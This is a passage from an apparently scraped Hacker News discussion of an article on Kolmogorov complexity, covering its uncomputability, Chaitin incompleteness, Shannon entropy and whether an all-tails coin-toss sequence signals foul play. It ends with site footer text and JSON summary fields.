symbols? If you used one bit symbols of '1' and '0' and a probability of each appearing a file that was just 11101110... repeating would you would find a different Shannon entropy to someone using 4 bit symbols. Shannon entropy is literally uncomputable in the real world. You can only compute it if you are given a fixed alphabet and frequencies but in the real world the optimal alphabet for a given file to calculate the minimum Shannon entropy is actually unknowable. That's where Kolmogorov complexity comes in. It states that \"well we don't actually have a way to define the alphabet in Shannon entropy in the real world but if we pretend we have a system (the universal computation) we could calculate it\". They then add in the size of the program length that does the calculation as well to prevent cheating by having a language that has a dictionary specific to the thing to encode and call that Kolmogorov complexity. But that's it. They are literally the same thing in essence. Kolmogorov complexity is in fact better than Shannon entropy for real world usage. It's every bit as computable in the real world (ie. not at all but at the very least you can do the best compression you can and make a guess!) but it at least states that upfront. For anyone wanting to claim that they had a CS assignment to calculate Shannon entropy and it's totally computable your teacher should probably have explained that the symbol frequencies for the alphabet given aren't actually computable like that in the real world as the optimal symbol lengths themselves aren't actually computable. You cannot in the real world just say \"compute the Shannon entropy of an alphabet with two symbols - B 30% and A 70%\" because you don't actually know if B and A are the optimal alphabet to define to minimize Shannon entropy. BBBAAAAAAA repeated has no entropy but it fits the definition of the question given and would give you a different result. reply causal 15 hours agoprevConfused how the interesting number paradox proves KC cannot be computed. reply Opocio 14 hours agoparentMe neither. But how I see it is that for solving KC in full generality you'll have to: - Start with the program that explicitly returns the original string. Let's say it has length N - run all possible programs that are shorter than N (just try all combinations of characters) - look at the results and pick the shortest program that compiles and outputs the original string The problem there is that you have to wait for all programs to end, and you don't know if they will end or not. So you have a problem that's equivalent to the halting problem (and that's not solvable) (and the halting problem is loosely related to the interesting number problem). (This is not a proof and I don't have a background in the field btw) reply causal 13 hours agorootparentThat intuitively makes sense to me. reply srcreigh 15 hours agoparentprevThe author is referring to something called Chaitin incompleteness. https://en.wikipedia.org/wiki/Kolmogorov_complexity#Chaitin'... Of course trivially some KC can be proven, ex a language with 1 or 0 characters that is interpreted to a specific string. Or to prove KC(x) where the compressed value has length N and you can list out all the results for all strings of length less than N, and they don't equal x, proves KC(x)=N. The interesting number paradox (Berry's paradox) is more related to Chaitin incompleteness. Basically, given a language there’s some code which enumerates proofs that KC of a string is more than some constant L, and returns the first one it finds. If the constant L is large enough, it becomes larger than the entire proof generating code. So the proof generating code will never find a proof of any KC larger than L. It's interesting to think about that the language gets more complex, proofs for larger strings become possible. And what it would mean for the languages to keep getting more complex indefinitely. it's a similar train of thought to busy beaver numbers and how systems of logic (PA,ZFC) become independent to values like BB(745), and what it could mean to have more and more advanced types of logic which don't become independent until some high target n. reply causal 13 hours agorootparentThis seems to assume that KC can be infinite. That must have been proven at some point? Otherwise it may be that there is some upper-bound for L which happens to also be the KC for a KC-computer. reply tromp 1 hour agorootparentKC(x) is always finite for any finite x. What we can say instead is that KC is unbounded. I.e. there is no finite bound on the value of KC(x). reply srcreigh 11 hours agorootparentprevyes, it’s a pigeonhole principle argument. A bit tricky to actually enumerate everything. Imagine KC had a limit k. Then there’s a fixed number of strings that can be compressed to k characters. so considering how there’s an infinite number of strings of length greater than k, they can’t all be compressed to be at most k. Therefore KC has no limit reply nyrikki 14 hours agoparentprevImpredicativity is the property you may want to dig into for formal proofs on why self references can be problematic. There is an important difference between semantically complete and syntactically complete that may cause some barriers. Gödels completeness theorem is about semantic completeness while his incompleteness theorems are about syntactic completeness. From Wikipedia: > A formal system is syntactically complete if and only if no unprovable sentence can be added to it without introducing an inconsistency. 'This statement is false', which Gödel mapped to natural numbers is an example of that inconsistency. If KC was computable, there would be an infinity of paradoxes like the interesting number paradox. The Berry paradox that is linked to in the INP link in the page has a subheading that relates it to KC computability. https://en.m.wikipedia.org/wiki/Berry_paradox reply explaininjs 14 hours agoparentprevSimilar to how the interesting number paradox relies on a \"shortcut statement\" to force-up the number of non-interest, If Kolmogorov complexity were computable you could create a \"shortcut program\" to force-down the shortest length of the program: Given: TM length of a JS runtime is 1,000,000 cells. Assume: KC is computable, and TM length of a `function KolmoglorovComplexity(string s)` is 4,000,000 cells. Known: KC's of values grow infinitely large - only 2^n-1 possible values can ever be encoded by n bits. Take: function Shortcut() { for (const s in generateEveryStringFromShortestUp()) { if ( KolomoglorovComplexity(s > 10,000,000) ) return s } } You see that the Shortcut function is encoded in 5,000,135 cells (plus that string generator, but that's small/constant), but it computes a value of arbitrarily large complexity (rather, one cell increase in the program length causes 10x increase in the complexity). A contradiction. reply causal 13 hours agorootparentStill confused. What is contradictory about a simple program computing a more complex program? Randomly generating a more complex program does not make the complex program reducible to a random string generator. reply basil-rash 10 hours agorootparentThe complexity cannot be over 10,000,000 if that simple program generated it. That is the precise definition of complexity. I don’t understand what you mean by reducibility to random strings, randomness has precisely nothing to do with complexity, even if they do tend to go together. reply JDEW 14 hours agoprev> It has been demonstrated that KC(x), can be reasonably estimated by the number of bits required to encode x using a compressor C (such as gzip) Talk about a cliffhanger :) Using [0] you get 32B for Alice and 40B for Bob. [0] It has been demonstrated that KC(x), can be reasonably estimated by the number of bits required to encode x using a compressor C (such as gzip) reply mojomark 14 hours agoprevI'm going to keep reading (because I love the KC topic), but I'd appreciate anyone confirming if the following are errors in this article: 1.) Conflating usage of the term \"random\" and \"complexity\". After all, a set of \"randomly\" drawn sample permutations from an alphabet are all equally likely. However, their \"complexity\" may differ, which is basically the point of the article, but the term more or less \"random\" keeps being used to refer to permutations with more or less \"complexity\", which I think is probably going to perpetuate confusion on this topic. 2.) From the article: \"Moreover, a string cannot be compressed if its KC(x)≥|x|\". Shouldn't the expression accompanying this statement be KC(x)=|x| ? reply tromp 14 hours agoparentRegarding point 1), one can easily show that with probability >= 1 - 2^{-k}, a randomly chosen bitstring x of length n must satisfy KC(x) >= n-k. After all, there are only 1+2+... 2^{n-k-1} = 2^{n-k}-1 shorter descriptions. So highly compressible strings are highly unlikely. Regarding 2), No, most strings x do not satisfy KC(x) = |x|, since you need to use some bits to specify that you're giving x literally. See the first theorem of [1]. [1] https://gist.github.com/tromp/86b3184f852f65bfb814e3ab0987d8... reply rhelz 14 hours agoparentprevre #1: the conflation is justified, but you couldn't guess that just from what was presented in the OP. There are some cool theorems which justify it tho---if you like Kolmogorov complexity you are in for a fun ride. re #2: No. Basically the > part of it handles the case when the smallest program which prints out the string is actually LARGER than the length of the string. In that case, the string is still incompressible. Compression means mapping from larger strings to smaller strings. reply pizza 14 hours agoprevI think maybe another way to put this is that Alice's number is in a typical set [0] of the distribution of bitstrings whereas Bob's might not be. Depending on the tolerance, the typical set can have near-total coverage of the distribution. Another way of making this about compression is that a random code that could encode typical set strings well probably will suffer some overhead when encoding Bob's, but most strings it will encode close to optimally. [0] https://en.wikipedia.org/wiki/Typical_set reply yamrzou 15 hours agoprevWell, I reached the end of the article (interesting btw), and still not convinced why bob can't claim that there was no foul-play involved and that his got his result due to excellent luck. reply ComplexSystems 14 hours agoparentYou don't need Kolmogorov complexity for this; simple hypothesis testing will do. The null hypothesis is that the coin is fair and the alternative is that it's biased. If Bob was correct, then there would simply never be any way to refute the null hypothesis of a fair coin, no matter what, since it can simply output anything at all with equal probability as anything else. In reality, that isn't how hypothesis testing works, and pretty much any standard technique (computing p-values, likelihood ratios, etc) will agree that 20 tails in a row is extremely unlikely given the null hypothesis in a way that 10 tails and 10 heads is not. reply copx 14 hours agoprev>Bob claims that since the probability of getting both his and Alice’s sequence is the same (2−20 ), it proves that there was no foul-play involved. ..and Bob is 100% right. >Bob credits his excellent luck. Alice is smart and cannot be easily convinced. She get’s back at Bob by claiming that probability cannot be used in this context as it reveals no information regarding the randomness of the obtained sequences. One can take a quick glance at the obtained sequences and easily point out that Alice’s sequence is more random than Bob’s sequence. No, it is not. Given a perfectly random coin toss Bob's sequence is indeed just as likely as Alice's sequence and in no way \"less random\" because both sequences result from the same randomness with equal probability. A nice example of human intuition being at odds with probability math, though. Bob's result seems less likely but it really is not. Which reminds me that I actually had to write my own computer simulation of the Monty Hall Problem before I was willing to believe the correct answer. I think (most?) human brains have a bug in the \"understanding probability\" subroutine. reply ptero 14 hours agoparentNot quite. Specifically, assuming independent random tosses A and B sequences are equally likely. No objection here. But the question posed is different: given a specific sequence, how likely it to have come from independent coin tosses? That is, how likely is it that Bob is cheating and his sequence was in fact not a sequence of a fair coin tosses. And for this KC is a reasonable measure. My 2c. reply Hunpeter 14 hours agoparentprevThe \"bug\" in this case imo, is that we interpret A's sequence as \"random garbage\" without regard to the actual contents, whereas we interpret B's as \"all Ts\". The question our brain asks then is \"is it more likely to get random garbage or all Ts?\" reply nerdponx 12 hours agorootparentRight. It might be more interesting to consider the count of Ts and Hs instead of considering exact sequences. reply Gimpei 14 hours agoparentprevCouldn’t you say that the distribution of tosses is less likely in the case of Bob? reply avmich 14 hours agoprev> Another thing to note is that Kolmogorov complexity of a string cannot be computed. There cannot exist a computer that will always guarantee the Kolmogorov complexity for all the strings. Sounds a bit puzzling. Surely for a particular programming language we can enumerate all programs, ordered by length etc. and check which is the shortest one giving the given string. So what's uncomputable here? For long strings that could take long time, but - ? reply floobertoober 14 hours agoparentWith a Turing complete language, you can't know whether a given program eventually yields the string, or continues indefinitely reply tromp 14 hours agoparentprev> So what's uncomputable here? Deciding whether the universal machine will ever halt on a particular input. I.e. the good old halting problem. reply MutualMisinfo 14 hours agoparentprevThe programs we check might not halt. reply Ono-Sendai 9 hours agoprevKolmogorov Complexity does not help with giving a universal measure of complexity or randomness: https://forwardscattering.org/page/0 reply AnotherGoodName 6 hours agoparentIt's a lot better than the alternatives. Particularly the misused Shannon entropy. The top rated answer for \"how do i measure Shannon entropy\" on stack overflow for example has an accepted answer of \"count the probabilities of all 8bit sequences and then multiply the log of those probabilities together as per the equation\". Which is a problematic answer. A file of all 8bit characters in sequence repeated many times over won't have any entropy but will have high entropy by this particular arbitrary measure. The problem with Shannon Entropy is that you have no way to define the optimal symbol lengths and frequencies for any given file. Kolmogorov Complexity on the other hand at least gives some way for us to get a rough estimate. It's just as incalculable as Shannon entropy but at least by essentially explicitly stating \"compress it using the best tool you have at hand and see how small it gets and also include the size of the compression program in the calculation to prevent cheating by using a dictionary\" you can get some rough estimate. Basically Kolmogorov Complexity is the best tool we have. It's not perfect because just like Shannon Entropy it's incalculable in reality but unlike Shannon Entropy we do have a good way to measure if one tool of calculating Kolmogorov Complexity is better than another tool. That measure is simply \"does it compress better?\". It's literally the best way to measure randomness of an arbitrary file. Any other way is pretty game-able. If someone uses Shannon entropy to measure randomness just look at the alphabet they use for that measurement and repeat that alphabet sequentially over and over again and you'll have a high shannon entropy for a clearly non-random file. Likewise other measurements might be game-able with large dictionaries to lookup. Kolmogorov complexity includes the entire program so that game doesn't work here. reply Ono-Sendai 3 hours agorootparentPractically speaking, trying to compress a file is a nice way of measuring... something. I was more talking about the theoretical notion of complexity. reply marius_k 14 hours agoprevSometimes I wonder what would be the smallest program to generate humans DNA. How many operations would it take and how would it compare to real world iterations of total evolution. reply wood_spirit 14 hours agoparentInterestingly, dna programs are quite compressible https://en.m.wikipedia.org/wiki/Compression_of_genomic_seque... reply arketyp 14 hours agoparentprevNot sure what kinds of selection pressures there has been for shorter DNA strings, but presumably you could compress it a great deal putting it in a .zip file. Now imagine the havoc caused by random mutations on that format though. reply amelius 11 hours agoparentprevIf we ever find a perfect theory of physics, then that might be the smallest program to generate human DNA. reply rhelz 14 hours agoprev [–] I think its bootless to try to define the \"minimum possible\" Kolmogorov complexity. Here's why: 1. Note, kolmogorov complexity is defined by the length of the shortest program which prints out the string. What counts is the number of instructions, and not the complexity of those instructions. 2. So say S is a very complex spring. We can always construct a turing machine which could print out S using a zero length program: it could just start in a state which prints out S when you turn it on, and then halts. 3. So there is no such thing as a turing machine which prints out every string shorter than any other turing machine prints it out, QED. That's the bad news. The good news is we don't even need to do that. For any string S, say that M and N are any two universal turing machines. Without loss of generality, specify that KM(S) <= KN(S). Then there is always some C for which KM(S) <= KN(S) + C. The constant C being the length of the program required to emulate machine M on machine N. We are used to abstracting out constant sums and constant factors like this. The strings we are dealing with (as a species) are growing in length exponentially--that's why we went from 8-bit, to 16bit, etc computers. So as the length of S goes to infinity, the difference between the its complexity for any two machines becomes negligible. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Alice suspects foul play in a coin tossing game against Bob due to a sequence of all tails, leading to a debate on probability and randomness of sequences.",
      "Kolmogorov Complexity is introduced to measure randomness by finding the shortest program to generate a string, addressing language dependency with a universal language and Turing Machine.",
      "Normalized Information Distance and Normalized Compression Distance are calculated using Kolmogorov Complexity, aiding Alice in outsmarting Bob in the game."
    ],
    "commentSummary": [
      "The article delves into Kolmogorov Complexity and Compression Distance, highlighting a language-agnostic approach using lambda calculus for defining complexity.",
      "It explores challenges in comparing optimal descriptions across languages, Turing machines' limitations, and the significance of a binary alphabet in compression methods.",
      "The discussion covers symbolic lookup, randomness, seed generation, compressibility, and the relationship between Shannon entropy and Kolmogorov complexity, providing insights into measuring complexity beyond traditional methods like Shannon entropy."
    ],
    "points": 128,
    "commentCount": 79,
    "retryCount": 0,
    "time": 1711822835
  }
]
